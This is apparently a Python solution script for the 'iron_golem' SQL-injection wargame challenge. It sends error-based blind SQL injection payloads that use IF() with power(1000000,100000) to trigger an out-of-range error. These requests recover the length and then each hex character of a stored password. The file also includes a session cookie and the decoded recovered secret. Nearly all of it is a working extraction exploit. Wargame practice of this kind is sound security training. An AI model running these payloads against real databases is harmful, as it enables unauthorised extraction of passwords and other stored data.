import requests
import string
import time

def string_to_hex(s):
    return ''.join(format(ord(char), '02x') for char in s)

def string_to_binary(s):
    concat = ''
    for c in s:
        val = ord(c)
        res = ''
        while val:
            res += str(int(val%2))
            val //= 2
        res += '0'*(8-len(res))
        concat += res[::-1]
    return concat
    # return ''.join(format(ord(char), '02x') for char in s)

# print(string_to_binary('^FLAG{$'))

URL = "https://los.rubiya.kr/chall/iron_golem_beb244fe41dd33998ef7bb4211c56c75.php"
SESSION_ID = "tbm4o2jsok14jk1i8n7bhcov7a"
cookies = {'PHPSESSID':SESSION_ID}
params ={'pw':''}

secret = ""
length = 0

# find length
for i in range(100):
    payload = f"'|| IF(length(hex(pw))={i},power(1000000,100000),0)--\t"
    params['pw'] = payload
    response = requests.get(URL,params=params, cookies=cookies)

    if "DOUBLE value is out of range" in response.text:
        length=i
        print(f'length of hex password is: {i}')
        break

for i in range(length+1):
    for c in string.digits+string.ascii_letters:
        # guess_pass = (secret+c).replace("_", r"\_")
        # binary = string_to_binary(guess_pass)
        # hex = string_to_hex(guess_pass)
        payload = f"'||IF(substr(hex(pw),{i},1)='{c}',power(1000000,100000),0)--\t"
        
        # print(f"{c}: {payload}")
        params['pw'] = payload
        # print(c)
        response = requests.get(URL,params=params, cookies=cookies)
        # print(response.text)
        
        if "DOUBLE value is out of range" in response.text:
            i += 1      
            secret += c
            print("password: "+secret.ljust(length, '*'))
            break


# Hex string
hex_string = '3036623561366331366538383330343735663938336363336138323565653961'

print(bytes.fromhex(hex_string).decode())